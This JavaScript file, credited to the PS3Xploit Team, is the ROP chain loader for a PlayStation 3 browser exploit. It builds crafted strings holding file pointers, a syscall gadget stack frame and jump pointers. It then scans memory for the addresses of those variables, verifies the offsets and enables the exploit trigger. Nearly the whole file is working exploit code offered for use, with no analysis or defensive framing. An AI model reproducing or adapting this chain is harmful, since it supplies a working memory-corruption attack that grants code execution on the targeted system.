// PS3 Default Template ROP Chain Loader
// PS3Xploit Team 2018 / ps3xploit.com


//function initROP(type)
function initROP()
{
	try
	{
		// ==============================================================================
		// Set basic defaults for each loop
		initRopDefaults();
		
		// Reset Addresses
		resetOffsetAddresses();
		
		// Check to make sure values are not corrupt
		checkSearchParams();
		
		//Set Pointer Values
		setDefaultPointerValues();
		setCustomPointerValues();
		
		// reset string search message to fail if total=max (fix later)
		if(total_loops===max_loops){result_msg=msg_string_verify_fail;}
		// ==============================================================================
		
		
		// ==============================================================================
		// Find File Pointers
		showFoundOffsets(offset_find_base_fp);
		ph = 0x6CFD;
		base_fp=unescape("\u4242\u0000")+hexw2bin(setFileMode("wb"))+hexw2bin(write_bytes)+hexw2bin(usb_fp)+hexw2bin(usb_fp2)+hexw2bin(hdd_fp)+hexw2bin(hdd_fp2)+hexw2bin(usb_fd)+hexw2bin(usb_fd2)+hexw2bin(hdd_fd)+hexw2bin(hdd_fd2)+hexw2bin(fd)+hexw2bin(fd2)+hexw2bin(magic)+unescape("\u0000")+str2u(path_fp)+unescape("\u0000")+str2u(path_fp2)+unescape("\u0000")+str2u(path_src_fp)+unescape("\u0000")+str2u(path_dest_fp)+unescape("\u0000\uFD6C");
		
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			base_fp=base_fp.replaceAt(0,hexh2bin(ph));
			base_fp_addr=findJsVariableOffset("base_fp",base_fp,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(base_fp_addr==0);
		
		// Set Pointer Offsets From Found Base Address
		setPointerOffsets();
		// ==============================================================================
		
		
		// ==============================================================================
		// Find Stackframe Pointer
		showFoundOffsets(offset_find_stack_frame);
		useCustomStackFrame();// call this to setup all params
		//stackFrameTest();// use default stackframe for testing
		
		stack_frame=unescape(syscallGadgetSetStartBytes())+unescape(syscallGadgetSet1(a1_r3,a1_r4,a1_r5,a1_r6,a1_r7,a1_r8,a1_r9,a1_r10,a1_r11,a1_r29,a1_r30,a1_r31,a1_jumpto,a2_r3,a2_r29,a2_r30,a2_r31,a2_jumpto,a3_r3,a3_r4,a3_r5,a3_r6,a3_r7,a3_r8,a3_r9,a3_r10,a3_r11,a3_r29,a3_r30,a3_r31,a3_jumpto,a4_r3,a4_r29,a4_r30,a4_r31,a4_jumpto,a5_r3,a5_r4,a5_r5,a5_r6,a5_r7,a5_r8,a5_r9,a5_r10,a5_r11,a5_r29,a5_r30,a5_r31,a5_jumpto,a6_r3,a6_r29,a6_r30,a6_r31,a6_jumpto,a7_r3,a7_r4,a7_r5,a7_r6,a7_r7,a7_r8,a7_r9,a7_r10,a7_r11,a7_r29,a7_r30,a7_r31,a7_jumpto,a8_r3,a8_r29,a8_r30,a8_r31,a8_jumpto,a9_r3,a9_r4,a9_r5,a9_r6,a9_r7,a9_r8,a9_r9,a9_r10,a9_r11,a9_r29,a9_r30,a9_r31,a9_jumpto,a10_r3,a10_r29,a10_r30,a10_r31,a10_jumpto,a11_r3,a11_r4,a11_r5,a11_r6,a11_r7,a11_r8,a11_r9,a11_r10,a11_r11,a11_r29,a11_r30,a11_r31,a11_jumpto,a12_r3,a12_r29,a12_r30,a12_r31,a12_jumpto,a13_r3,a13_r4,a13_r5,a13_r6,a13_r7,a13_r8,a13_r9,a13_r10,a13_r11,a13_r29,a13_r30,a13_r31,a13_jumpto,a14_r3,a14_r29,a14_r30,a14_r31,a14_jumpto,a15_r3,a15_r4,a15_r5,a15_r6,a15_r7,a15_r8,a15_r9,a15_r10,a15_r11,a15_r29,a15_r30,a15_r31,a15_jumpto,a16_r3,a16_r29,a16_r30,a16_r31,a16_jumpto,a17_r3,a17_r4,a17_r5,a17_r6,a17_r7,a17_r8,a17_r9,a17_r10,a17_r11,a17_r29,a17_r30,a17_r31,a17_jumpto,a18_r3,a18_r29,a18_r30,a18_r31,a18_jumpto,a19_r3,a19_r29,a19_r30,a19_r31,a19_jumpto,a20_r3,a20_r4,a20_r5,a20_r6,a20_r7,a20_r8,a20_r9,a20_r10,a20_r11,a20_r29,a20_r30,a20_r31,a20_jumpto,a21_r3,a21_r29,a21_r30,a21_r31,a21_jumpto,a22_r3,a22_r29,a22_r30,a22_r31,a22_jumpto,a23_r3,a23_r4,a23_r5,a23_r6,a23_r7,a23_r8,a23_r9,a23_r10,a23_r11,a23_r29,a23_r30,a23_r31,a23_jumpto,a24_r3,a24_r29,a24_r30,a24_r31,a24_jumpto,a25_r3,a25_r29,a25_r30,a25_r31,a25_jumpto,a26_r3,a26_r4,a26_r5,a26_r6,a26_r7,a26_r8,a26_r9,a26_r10,a26_r11,a26_r29,a26_r30,a26_r31,a26_jumpto,a27_r3,a27_r29,a27_r30,a27_r31,a27_jumpto,a28_r3,a28_r29,a28_r30,a28_r31,a28_jumpto,a29_r3,a29_r4,a29_r5,a29_r6,a29_r7,a29_r8,a29_r9,a29_r10,a29_r11,a29_r29,a29_r30,a29_r31,a29_jumpto,a30_r3,a30_r29,a30_r30,a30_r31,a30_jumpto,a31_r3,a31_r29,a31_r30,a31_r31,a31_jumpto,a32_r3,a32_r4,a32_r5,a32_r6,a32_r7,a32_r8,a32_r9,a32_r10,a32_r11,a32_r29,a32_r30,a32_r31,a32_jumpto,a33_r3,a33_r29,a33_r30,a33_r31,a33_jumpto,padding1,padding2,padding3,padding4,extra1,extra2,extra3,extra4,extra5,extra6,extra7))+unescape(syscallGadgetSetEndBytes());
		ph = 0x7EBE;
		search_base_offset=search_base_offset_min+search_base_offset_adjust;
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			stack_frame=stack_frame.replaceAt(0,hexh2bin(ph));
			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(stack_frame_addr==0);
		// ==============================================================================
		
		
		// ==============================================================================
		// Find Jump 2 Pointer
		showFoundOffsets(offset_find_jump2);
		jump_2=unescape("\u4141\u0000")+hexw2bin(stack_frame_addr)+unescape("\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")+hexw2bin(stack_frame_addr)+unescape("\uFB7E");
		ph = 0x7EFB;
		search_base_offset=search_base_offset_min+search_base_offset_adjust_jump2;
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			jump_2=jump_2.replaceAt(0,hexh2bin(ph));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(jump_2_addr==0);
		// ==============================================================================
		
		
		// ==============================================================================
		// Find Jump 1 Pointer
		showFoundOffsets(offset_find_jump1);
		//jump_1=reload_jump1(true);
		jump_1=unescape("\u4141\u0000")+hexw2bin(jump_2_addr)+unescape("\uBF6E");
		ph = 0x6EBF;
		search_base_offset=search_base_offset_min+search_base_offset_adjust_jump1;
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			jump_1=jump_1.replaceAt(0,hexh2bin(ph));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(jump_1_addr==0);
		// ==============================================================================
		
		
		// ==============================================================================
		allOffsetsFound=true;
		showFoundOffsets(offset_find_success);
		
		// Trigger Exploit
		if (verify_offsets)
		{
			base=checkMemory(base_fp_addr-0x4,0x100,base_fp.length,6);
			j2=checkMemory(jump_2_addr-0x4,0x100,jump_2.length,6);
			j1=checkMemory(jump_1_addr-0x4,0x100,jump_1.length,6);
			
			// Verify Stackframe
			if(verify_stackframe)
			{
				stk=checkMemory(stack_frame_addr-0x4,0x100,stack_frame_addr.length,6);
			}
			else
			{
				stackframe_verified=true;// fake verify
			}
			
			if(allOffsetsFound)
			{
				if(debug_mode)logAdd(verify_success);
				if(t_out!=0){searchResetTimeout();}
				searchSucceed();
				enableActiveTrigger();
				load_rop.focus();
				offsets_verified=true;
				result_msg=msg_verified_offsets;// change to verified status
				showFoundOffsets(offset_find_success);
			}
			else 
			{
				if(debug_mode)logAdd(verify_fail);
				if(total_loops<max_loops){reloadInitROP();}
				else{failCount+1;searchFail();}
				reload_page.focus();
			}
		}
		else
		{
			if(t_out!=0){searchResetTimeout();}
			if(debug_mode)logAdd(verify_skip);
			searchSucceed();
			enableActiveTrigger();
			load_rop.focus();
			showFoundOffsets(offset_find_success);
		}
		// ==============================================================================
		
		// Log Crap For Garbage Collection
		logForGC();
	} 
	catch(e) 
	{
		if(debug_mode){logAdd(e, log_div);}
	}
}